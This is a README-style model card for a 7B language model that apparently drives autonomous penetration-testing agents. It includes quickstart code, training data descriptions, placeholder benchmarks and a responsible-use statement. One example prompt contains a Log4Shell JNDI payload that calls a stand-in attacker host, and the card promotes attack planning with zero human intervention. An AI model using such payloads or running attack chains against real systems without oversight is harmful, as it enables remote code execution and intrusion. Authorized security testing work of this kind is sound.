<p align="center">
  <img src="assets/vext-wordmark.png" alt="VEXT" width="280"/>
</p>

<h1 align="center">Vext-labs-7B-v1.1</h1>
<p align="center"><strong>The first open-source language model purpose-built for autonomous penetration testing.</strong></p>

<p align="center">
  <a href="https://tryvext.com">Website</a> |
  <a href="#quickstart">Quickstart</a> |
  <a href="#capabilities">Capabilities</a> |
  <a href="#benchmarks">Benchmarks</a>
</p>

---

## Overview

**Vext-labs-7B-v1.1** is a 7-billion parameter language model created by [Vext Labs Inc.](https://tryvext.com) for autonomous security testing. It is trained to reason about security tool output, plan multi-step attack strategies, classify vulnerabilities, and generate remediation guidance.

This model powers the [VEXT](https://tryvext.com) autonomous penetration testing platform, where it drives agents that execute real security tools (nuclei, dalfox, sqlmap, gobuster, and 20+ others) against authorized targets with zero human intervention.

## Capabilities

Vext-labs-7B-v1.1 excels at four core security tasks:

- **Tool Output Interpretation** — Parse and reason about raw output from 25+ security tools including nuclei, dalfox, sqlmap, gobuster, naabu, katana, httpx, subfinder, and more
- **Attack Strategy Planning** — Given a target scope and reconnaissance data, determine which tools to run, in what order, and with what parameters
- **Vulnerability Classification** — Distinguish true positives from false positives with high accuracy, reducing noise for security teams
- **Remediation Guidance** — Generate actionable fix recommendations for discovered vulnerabilities

## Quickstart

### With vLLM (Recommended for Production)

```bash
pip install vllm

python -m vllm.entrypoints.openai.api_server \
    --model Vext-Labs-Inc/Vext-labs-7B-v1.1 \
    --trust-remote-code
```

Then use the OpenAI-compatible API:

```python
from openai import OpenAI

client = OpenAI(base_url="http://localhost:8000/v1", api_key="unused")

response = client.chat.completions.create(
    model="Vext-Labs-Inc/Vext-labs-7B-v1.1",
    messages=[
        {
            "role": "system",
            "content": "You are an autonomous security testing agent. Analyze tool output and decide next actions."
        },
        {
            "role": "user",
            "content": """Nuclei scan results:
[critical] CVE-2021-44228 Log4Shell detected at /api/login
POC: ${jndi:ldap://attacker.com/a}

What is this vulnerability and what should I do next?"""
        }
    ],
    temperature=0.3,
    max_tokens=512
)
print(response.choices[0].message.content)
```

### With Transformers

```python
from transformers import AutoModelForCausalLM, AutoTokenizer

model = AutoModelForCausalLM.from_pretrained(
    "Vext-Labs-Inc/Vext-labs-7B-v1.1",
    torch_dtype="auto",
    device_map="auto"
)
tokenizer = AutoTokenizer.from_pretrained("Vext-Labs-Inc/Vext-labs-7B-v1.1")

messages = [
    {"role": "system", "content": "You are a security testing agent."},
    {"role": "user", "content": "Gobuster found /admin, /api/v1, /backup. Plan the next steps."}
]

text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
inputs = tokenizer(text, return_tensors="pt").to(model.device)
output = model.generate(**inputs, max_new_tokens=512)
print(tokenizer.decode(output[0], skip_special_tokens=True))
```

## Training

| Parameter | Value |
|-----------|-------|
| Parameters | 7B |
| Training steps | 5,000 |
| Training samples | 436,922 |
| Final loss | 0.51 |
| Precision | bfloat16 |
| Context length | 8,192 tokens |

### Training Data

Trained on security testing data generated by the VEXT autonomous pentesting platform:

- **Tool execution traces** — Input parameters, raw stdout/stderr, parsed results, and exit codes from 25+ security tools
- **Attack planning decisions** — Which tool to run next, why, and what parameters to use based on current context
- **Vulnerability validation** — True positive vs false positive classification with supporting evidence chains
- **Multi-step attack chains** — Full reconnaissance-to-exploitation sequences with reasoning at each step

Data was collected from authorized testing against intentionally vulnerable applications (OWASP Juice Shop, DVWA, bWAPP, WebGoat, and others) and authorized bug bounty targets.

## Benchmarks

Results from the Juice Shop CTF evaluation (v1.1 model driving 3 autonomous agents):

| Metric | Result |
|--------|--------|
| Vulnerabilities found | TBD |
| Validated findings | TBD |
| False positive rate | TBD |
| Time to first finding | TBD |

*Benchmarks will be updated after the evaluation run completes.*

## Responsible Use

This model is intended for **authorized security testing only**:

- Within the scope of authorized penetration testing engagements
- Against applications you own or have explicit written permission to test
- In CTF (Capture the Flag) competitions and security training environments
- For defensive security research and vulnerability assessment

**Do not use this model for unauthorized access to computer systems.**

## About Vext Labs

[Vext Labs Inc.](https://tryvext.com) builds autonomous security testing agents that combine LLM reasoning with real security tools. Our agents run full penetration tests — from reconnaissance to exploitation to reporting — with human-level decision making.

## License

Apache 2.0 — See [LICENSE](LICENSE) for details.

## Citation

```bibtex
@misc{vext-labs-7b-v1.1,
  title={Vext-labs-7B-v1.1: A Language Model for Autonomous Penetration Testing},
  author={Vext Labs Inc.},
  year={2026},
  url={https://github.com/Vext-Labs-Inc/Vext-labs-7B-v1.1-}
}
```
